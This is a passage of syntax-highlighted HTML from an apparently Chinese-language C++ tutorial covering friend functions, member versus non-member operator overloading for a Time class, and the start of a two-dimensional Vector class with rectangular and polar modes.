class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 链式输出</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;t1 + t2 = &quot;</span> &lt;&lt; t1 + t2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p><strong>输出:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Time t1: 3 hours, 45 minutes</span><br><span class="line">Time t2: 2 hours, 15 minutes</span><br><span class="line">Sum: 6 hours, 0 minutes</span><br><span class="line">t1 + t2 &#x3D; 6 hours, 0 minutes</span><br></pre></td></tr></table></figure><p><strong>处理 <code>double * Time</code> (友元函数方式):</strong></p><p>在上一节中，我们定义了 <code>Time operator*(double mult) const;</code> 作为成员函数，可以处理 <code>time * double</code> 的情况，但不能处理 <code>double * time</code>。我们可以通过添加一个<strong>非成员友元函数</strong>来解决这个问题。</p><ol><li><p><strong>在 <code>time.h</code> 中添加友元声明:</strong></p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filepath: d:\ProgramData\files_Cpp\250424\time.h</span></span><br><span class="line"><span class="comment">// ... existing code ...</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Time</span> &#123;</span></span><br><span class="line">    <span class="comment">// ... existing members ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ... existing methods ...</span></span><br><span class="line">    Time <span class="keyword">operator</span>*(<span class="keyword">double</span> mult) <span class="keyword">const</span>; <span class="comment">// 处理 time * double</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 友元函数处理 double * time</span></span><br><span class="line">    <span class="keyword">friend</span> Time <span class="keyword">operator</span>*(<span class="keyword">double</span> m, <span class="keyword">const</span> Time &amp; t);</span><br><span class="line">    <span class="keyword">friend</span> <span class="built_in">std</span>::ostream &amp; <span class="keyword">operator</span>&lt;&lt;(<span class="built_in">std</span>::ostream &amp; os, <span class="keyword">const</span> Time &amp; t);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// ... existing code ...</span></span><br></pre></td></tr></table></figure></li><li><p><strong>在 <code>time.cpp</code> 中添加友元定义:</strong></p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filepath: d:\ProgramData\files_Cpp\250424\time.cpp</span></span><br><span class="line"><span class="comment">// ... existing code ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义友元函数 operator* (double * Time)</span></span><br><span class="line"><span class="comment">// 通常可以简单地调用已有的成员函数版本</span></span><br><span class="line">Time <span class="keyword">operator</span>*(<span class="keyword">double</span> m, <span class="keyword">const</span> Time &amp; t) &#123;</span><br><span class="line">    <span class="comment">// return t.operator*(m); // 直接调用成员函数</span></span><br><span class="line">    <span class="keyword">return</span> t * m; <span class="comment">// 或者更简洁地使用已重载的 Time * double 运算符</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::ostream &amp; <span class="keyword">operator</span>&lt;&lt;(<span class="built_in">std</span>::ostream &amp; os, <span class="keyword">const</span> Time &amp; t) &#123;</span><br><span class="line">    os &lt;&lt; t.hours &lt;&lt; <span class="string">&quot; hours, &quot;</span> &lt;&lt; t.minutes &lt;&lt; <span class="string">&quot; minutes&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> os;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>现在，<code>double * time</code> 的运算也可以正常工作了：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.cpp</span></span><br><span class="line"><span class="function">Time <span class="title">t1</span><span class="params">(<span class="number">2</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line"><span class="keyword">double</span> factor = <span class="number">2.5</span>;</span><br><span class="line">Time product1 = t1 * factor; <span class="comment">// 调用成员函数 t1.operator*(factor)</span></span><br><span class="line">Time product2 = factor * t1; <span class="comment">// 调用友元函数 operator*(factor, t1)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; product1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: 5 hours, 0 minutes</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; product2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: 5 hours, 0 minutes</span></span><br></pre></td></tr></table></figure><p><strong>总结:</strong></p><ul><li>  友元（函数或类）被授予访问声明其为友元的类的私有和保护成员的权限。</li><li>  使用 <code>friend</code> 关键字在类定义内部声明友元。</li><li>  友元对于重载某些运算符（尤其是需要访问私有成员且不能作为成员函数的运算符，如 <code>&lt;&lt;</code>）非常有用。</li><li>  友元也用于实现需要紧密协作但又不适合放在同一个类中的功能。</li><li>  虽然友元打破了纯粹的封装，但它提供了一种受控的、明确的方式来在必要时绕过访问限制。应谨慎使用，避免滥用。</li></ul><h2 id="11-4-重载运算符：作为成员函数还是非成员函数"><a href="#11-4-重载运算符：作为成员函数还是非成员函数" class="headerlink" title="11.4 重载运算符：作为成员函数还是非成员函数"></a>11.4 重载运算符：作为成员函数还是非成员函数</h2><p>在重载运算符时，一个关键的决定是将其实现为<strong>类的成员函数</strong>还是<strong>非成员函数</strong>（通常是友元）。这个选择会影响函数的调用方式、参数列表以及某些情况下的行为。</p><p><strong>核心区别回顾:</strong></p><ul><li><p><strong>成员函数:</strong></p><ul><li>  通过类的对象调用。</li><li>  左操作数隐式地是调用该函数的对象（通过 <code>this</code> 指针访问）。</li><li>  对于二元运算符，它只需要一个显式参数（右操作数）。</li><li>  对于一元运算符，它没有显式参数。</li><li>  可以直接访问类的 <code>private</code> 和 <code>protected</code> 成员。</li><li>  示例：<code>obj1 + obj2</code> 调用 <code>obj1.operator+(obj2)</code>。</li></ul></li><li><p><strong>非成员函数:</strong></p><ul><li>  独立于类定义之外（但通常在同一个头文件或源文件中）。</li><li>  所有操作数都必须作为显式参数传递。</li><li>  对于二元运算符，它需要两个显式参数（左、右操作数）。</li><li>  对于一元运算符，它需要一个显式参数。</li><li>  如果需要访问类的 <code>private</code> 或 <code>protected</code> 成员，必须被声明为该类的**友元 (<code>friend</code>)**。</li><li>  示例：<code>obj1 + obj2</code> 调用 <code>operator+(obj1, obj2)</code>。</li></ul></li></ul><p><strong>选择指南:</strong></p><p>以下是一些通用指南和特定运算符的惯例：</p><ol><li><p><strong>必须是成员函数的运算符:</strong><br> 以下运算符<strong>只能</strong>通过成员函数进行重载：</p><ul><li>  <code>=</code> (赋值运算符)</li><li>  <code>[]</code> (下标运算符)</li><li>  <code>()</code> (函数调用运算符)</li><li>  <code>-&gt;</code> (成员访问运算符)</li><li>  任何类型转换运算符 (如 <code>operator int()</code>)</li></ul></li><li><p><strong>通常作为成员函数的运算符 (修改对象状态):</strong><br> 对于那些通常会<strong>修改其左操作数对象状态</strong>的运算符，将它们实现为成员函数通常更自然。这包括：</p><ul><li><p><strong>复合赋值运算符:</strong> <code>+=</code>, <code>-=</code>, <code>*=</code>, <code>/=</code>, <code>%=</code>, <code>&amp;=</code>, <code>|=</code>, <code>^=</code>, <code>&lt;&lt;=</code>, <code>&gt;&gt;=</code></p><ul><li>  例如，<code>time1 += time2;</code> 直观地表示修改 <code>time1</code>。实现为 <code>time1.operator+=(time2)</code> 很合适。</li></ul></li><li><p><strong>递增/递减运算符:</strong> <code>++</code>, <code>--</code> (前缀和后缀)</p><ul><li>  例如，<code>++myCounter;</code> 或 <code>myCounter++;</code> 修改 <code>myCounter</code> 对象。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 示例：重载 += 作为成员函数</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Time</span> &#123;</span></span><br><span class="line">    <span class="comment">// ... private members ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ... other methods ...</span></span><br><span class="line">    Time&amp; <span class="keyword">operator</span>+=(<span class="keyword">const</span> Time&amp; t); <span class="comment">// 返回引用以支持链式赋值</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Time&amp; Time::<span class="keyword">operator</span>+=(<span class="keyword">const</span> Time&amp; t) &#123;</span><br><span class="line">    <span class="comment">// 将 t 加到 *this 对象上</span></span><br><span class="line">    <span class="keyword">this</span>-&gt;minutes += t.minutes;</span><br><span class="line">    <span class="keyword">this</span>-&gt;hours += t.hours + <span class="keyword">this</span>-&gt;minutes / <span class="number">60</span>;</span><br><span class="line">    <span class="keyword">this</span>-&gt;minutes %= <span class="number">60</span>;</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>; <span class="comment">// 返回修改后的对象自身的引用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>通常作为非成员函数 (通常是友元) 的运算符:</strong><br> 对于那些不修改操作数状态（而是创建一个新值）或者需要对称处理操作数（允许不同类型的左操作数）的运算符，通常将它们实现为非成员函数（通常是友元）。</p><ul><li><p><strong>二元算术运算符:</strong> <code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>%</code></p><ul><li>  虽然 <code>+</code> 也可以作为成员函数（如 11.2 节所示），但作为非成员友元函数可以提供更好的对称性。例如，如果类允许从 <code>double</code> 到 <code>Time</code> 的隐式转换（通常不推荐，但可能存在），那么友元函数 <code>operator+(const Time&amp;, const Time&amp;)</code> 可以处理 <code>time + time</code>、<code>time + double</code> 和 <code>double + time</code>（通过转换），而成员函数只能处理 <code>time + time</code> 和 <code>time + double</code>。</li><li>  对于像 <code>double * Time</code> 这样的混合类型运算，如果想让 <code>double</code> 作为左操作数，则<strong>必须</strong>使用非成员函数（如 11.3 节所示）。</li></ul></li><li><p><strong>关系运算符:</strong> <code>==</code>, <code>!=</code>, <code>&lt;</code>, <code>&gt;</code>, <code>&lt;=</code>, <code>&gt;=</code></p><ul><li>  将它们实现为非成员友元可以更容易地处理对称性，并可能允许混合类型的比较（如果定义了适当的转换或重载版本）。</li></ul></li><li><p>  <strong>位运算符:</strong> <code>&amp;</code>, <code>|</code>, <code>^</code></p></li><li><p>  <strong>逻辑运算符:</strong> <code>&amp;&amp;</code>, <code>||</code> (较少重载)</p></li><li><p><strong>输入/输出运算符:</strong> <code>&lt;&lt;</code>, <code>&gt;&gt;</code></p><ul><li>  <strong>必须</strong>是非成员函数，因为左操作数是 <code>ostream</code> 或 <code>istream</code> 对象，而不是你的类的对象。它们几乎总是需要成为友元以访问私有数据进行读写。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 示例：重载 == 作为非成员友元函数</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Time</span> &#123;</span></span><br><span class="line">    <span class="comment">// ... private members ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ... methods ...</span></span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">bool</span> <span class="keyword">operator</span>==(<span class="keyword">const</span> Time&amp; t1, <span class="keyword">const</span> Time&amp; t2);</span><br><span class="line">    <span class="comment">// ... other friends ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span>==(<span class="keyword">const</span> Time&amp; t1, <span class="keyword">const</span> Time&amp; t2) &#123;</span><br><span class="line">    <span class="keyword">return</span> (t1.hours == t2.hours &amp;&amp; t1.minutes == t2.minutes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ol><p><strong>总结:</strong></p><table><thead><tr><th align="left">运算符类型</th><th align="left">推荐实现方式</th><th align="left">原因</th></tr></thead><tbody><tr><td align="left"><code>=</code>, <code>[]</code>, <code>()</code>, <code>-&gt;</code>, <code>type()</code></td><td align="left"><strong>必须</strong>是成员函数</td><td align="left">C++ 语言规定</td></tr><tr><td align="left"><code>+=</code>, <code>-=</code>, <code>*=</code>, etc.</td><td align="left">成员函数</td><td align="left">通常修改左操作数对象的状态</td></tr><tr><td align="left"><code>++</code>, <code>--</code></td><td align="left">成员函数</td><td align="left">修改对象状态</td></tr><tr><td align="left"><code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>%</code></td><td align="left">非成员友元 (或成员)</td><td align="left">对称性，允许混合类型左操作数 (如果需要)，通常不修改操作数</td></tr><tr><td align="left"><code>==</code>, <code>!=</code>, <code>&lt;</code>, <code>&gt;</code>, <code>&lt;=</code>, <code>&gt;=</code></td><td align="left">非成员友元 (或成员)</td><td align="left">对称性</td></tr><tr><td align="left"><code>&lt;&lt;</code>, <code>&gt;&gt;</code></td><td align="left"><strong>必须</strong>是非成员友元</td><td align="left">左操作数是流对象 (<code>ostream</code>, <code>istream</code>)，需要访问私有成员</td></tr><tr><td align="left">一元 <code>+</code>, <code>-</code>, <code>*</code>, <code>&amp;</code>, <code>!</code>, <code>~</code></td><td align="left">成员或非成员友元</td><td align="left">成员函数无参数，非成员函数一个参数</td></tr></tbody></table><p><strong>选择依据:</strong></p><ul><li>  <strong>强制要求:</strong> 某些运算符必须是成员函数。</li><li>  <strong>左操作数类型:</strong> 如果左操作数必须是特定类型（如 <code>ostream</code>），则必须使用非成员函数。</li><li>  <strong>状态修改:</strong> 如果运算符主要目的是修改左操作数的状态，成员函数通常更自然。</li><li>  <strong>对称性/类型转换:</strong> 如果希望运算符对操作数顺序具有对称性，或者希望允许对左操作数进行隐式类型转换（需谨慎），非成员函数（通常是友元）是更好的选择。</li></ul><p>在实践中，对于常见的二元运算符如 <code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>，一种常见的模式是：</p><ol><li> 将<strong>复合赋值运算符</strong>（如 <code>+=</code>, <code>-=</code>）实现为<strong>成员函数</strong>。</li><li> 将对应的<strong>二元运算符</strong>（如 <code>+</code>, <code>-</code>）实现为<strong>非成员友元函数</strong>，并在其内部调用复合赋值运算符来完成实际工作。</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 示例模式</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Time</span> &#123;</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Time&amp; <span class="keyword">operator</span>+=(<span class="keyword">const</span> Time&amp; t); <span class="comment">// 成员函数</span></span><br><span class="line">    <span class="keyword">friend</span> Time <span class="keyword">operator</span>+(<span class="keyword">const</span> Time&amp; t1, <span class="keyword">const</span> Time&amp; t2); <span class="comment">// 非成员友元</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Time&amp; Time::<span class="keyword">operator</span>+=(<span class="keyword">const</span> Time&amp; t) &#123;</span><br><span class="line">    <span class="comment">// ... 实现 += 逻辑 ...</span></span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// operator+ 调用 operator+=</span></span><br><span class="line">Time <span class="keyword">operator</span>+(<span class="keyword">const</span> Time&amp; t1, <span class="keyword">const</span> Time&amp; t2) &#123;</span><br><span class="line">    Time sum = t1; <span class="comment">// 创建一个副本</span></span><br><span class="line">    sum += t2;     <span class="comment">// 使用成员函数 +=</span></span><br><span class="line">    <span class="keyword">return</span> sum;    <span class="comment">// 返回结果</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种模式可以减少代码重复。</p><h2 id="11-5-再读重载：一个矢量类"><a href="#11-5-再读重载：一个矢量类" class="headerlink" title="11.5 再读重载：一个矢量类"></a>11.5 再读重载：一个矢量类</h2><p>本节我们将通过定义一个表示二维矢量（或向量）的类，进一步探讨运算符重载的应用。矢量既可以用直角坐标 (x, y) 表示，也可以用极坐标 (大小/模, 角度) 表示。我们的 <code>Vector</code> 类将能够存储这两种表示，并允许用户在它们之间切换。</p><h3 id="11-5-1-使用状态成员"><a href="#11-5-1-使用状态成员" class="headerlink" title="11.5.1 使用状态成员"></a>11.5.1 使用状态成员</h3><p>为了同时支持直角坐标和极坐标，我们的 <code>Vector</code> 类需要包含相应的成员：</p><ul><li>  <code>x</code>: x 分量</li><li>  <code>y</code>: y 分量</li><li>  <code>mag</code>: 矢量的大小（模）</li><li>  <code>ang</code>: 矢量的角度</li></ul><p>同时，我们需要一个状态成员来指示当前对象是以哪种模式表示的（直角坐标或极坐标），以及一些方法来根据一种表示计算另一种表示。</p><p><strong>vector.h (类定义)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filepath: d:\ProgramData\files_Cpp\250424\vector.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> VECTOR_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> VECTOR_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> VECTOR &#123; <span class="comment">// 将类放入命名空间</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vector</span> &#123;</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="comment">// 枚举类型，用于表示模式：直角坐标(RECT) 或 极坐标(POL)</span></span><br><span class="line">        <span class="class"><span class="keyword">enum</span> <span class="title">Mode</span> &#123;</span>RECT, POL&#125;;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="keyword">double</span> x;       <span class="comment">// x 分量</span></span><br><span class="line">        <span class="keyword">double</span> y;       <span class="comment">// y 分量</span></span><br><span class="line">        <span class="keyword">double</span> mag;     <span class="comment">// 矢量的大小 (模)</span></span><br><span class="line">        <span class="keyword">double</span> ang;     <span class="comment">// 矢量的角度 (弧度)</span></span><br><span class="line">        Mode mode;      <span class="comment">// 当前模式 (RECT 或 POL)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 私有辅助函数，用于根据一种表示计算另一种表示</span></span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">set_mag</span><span class="params">()</span></span>; <span class="comment">// 根据 x, y 计算 mag</span></span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">set_ang</span><span class="params">()</span></span>; <span class="comment">// 根据 x, y 计算 ang (弧度)</span></span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">set_x</span><span class="params">()</span></span>;   <span class="comment">// 根据 mag, ang 计算 x</span></span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">set_y</span><span class="params">()</span></span>;   <span class="comment">// 根据 mag, ang 计算 y</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="comment">// 构造函数</span></span><br><span class="line">        Vector(); <span class="comment">// 默认构造函数</span></span><br><span class="line">        <span class="comment">// 根据指定模式和值构造</span></span><br><span class="line">        Vector(<span class="keyword">double</span> n1, <span class="keyword">double</span> n2, Mode form = RECT);</span><br><span class="line">        <span class="comment">// 重置矢量</span></span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">reset</span><span class="params">(<span class="keyword">double</span> n1, <span class="keyword">double</span> n2, Mode form = RECT)</span></span>;</span><br><span class="line">        ~Vector(); <span class="comment">// 析构函数</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取各分量的值</span></span><br><span class="line">        <span class="function"><span class="keyword">double</span> <span class="title">xval</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> x; &#125;</span><br><span class="line">        <span class="function"><span class="keyword">double</span> <span class="title">yval</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> y; &#125;</span><br><span class="line">        <span class="function"><span class="keyword">double</span> <span class="title">magval</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> mag; &#125;</span><br><span class="line">        <span class="function"><span class="keyword">double</span> <span class="title">angval</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="comment">// 返回角度 (度)</span></span><br><span class="line">             <span class="comment">// 将弧度转换为度</span></span><br><span class="line">             <span class="keyword">if</span> (ang == <span class="number">0.0</span> &amp;&amp; x == <span class="number">0.0</span> &amp;&amp; y == <span class="number">0.0</span>) <span class="keyword">return</span> <span class="number">0.0</span>; <span class="comment">// 处理零向量</span></span><br><span class="line">             <span class="keyword">else</span> <span class="keyword">if</span> (ang == <span class="number">0.0</span> &amp;&amp; x &gt; <span class="number">0.0</span>) <span class="keyword">return</span> <span class="number">0.0</span>; <span class="comment">// x轴正方向</span></span><br><span class="line">             <span class="keyword">else</span> <span class="keyword">if</span> (ang == <span class="number">0.0</span> &amp;&amp; x &lt; <span class="number">0.0</span>) <span class="keyword">return</span> <span class="number">180.0</span>; <span class="comment">// x轴负方向 (atan2会处理)</span></span><br><span class="line">             <span class="keyword">else</span> <span class="keyword">return</span> ang * <span class="number">180.0</span> / <span class="number">3.141592653589793</span>; <span class="comment">// 假设 M_PI 不可用</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置模式</span></span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">polar_mode</span><span class="params">()</span></span>; <span class="comment">// 设置为极坐标模式</span></span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">rect_mode</span><span class="params">()</span></span>;  <span class="comment">// 设置为直角坐标模式</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// --- 运算符重载 ---</span></span><br><span class="line">        <span class="comment">// 加法: Vector + Vector</span></span><br><span class="line">        Vector <span class="keyword">operator</span>+(<span class="keyword">const</span> Vector &amp; b) <span class="keyword">const</span>;</span><br><span class="line">        <span class="comment">// 减法: Vector - Vector</span></span><br><span class="line">        Vector <span class="keyword">operator</span>-(<span class="keyword">const</span> Vector &amp; b) <span class="keyword">const</span>;</span><br><span class="line">        <span class="comment">// 取反: -Vector</span></span><br><span class="line">        Vector <span class="keyword">operator</span>-() <span class="keyword">const</span>;</span><br><span class="line">        <span class="comment">// 乘法: double * Vector (友元) 或 Vector * double (成员或友元)</span></span><br><span class="line">        Vector <span class="keyword">operator</span>*(<span class="keyword">double</span> n) <span class="keyword">const</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// --- 友元函数 ---</span></span><br><span class="line">        <span class="comment">// 乘法: double * Vector</span></span><br><span class="line">        <span class="keyword">friend</span> Vector <span class="keyword">operator</span>*(<span class="keyword">double</span> n, <span class="keyword">const</span> Vector &amp; a);</span><br><span class="line">        <span class="comment">// 输出: cout &lt;&lt; Vector</span></span><br><span class="line">        <span class="keyword">friend</span> <span class="built_in">std</span>::ostream &amp; <span class="keyword">operator</span>&lt;&lt;(<span class="built_in">std</span>::ostream &amp; os, <span class="keyword">const</span> Vector &amp; v);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">&#125; <span class="comment">// namespace VECTOR</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// VECTOR_H_</span></span></span><br></pre></td></tr></table></figure><p><strong>vector.cpp (类实现)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span 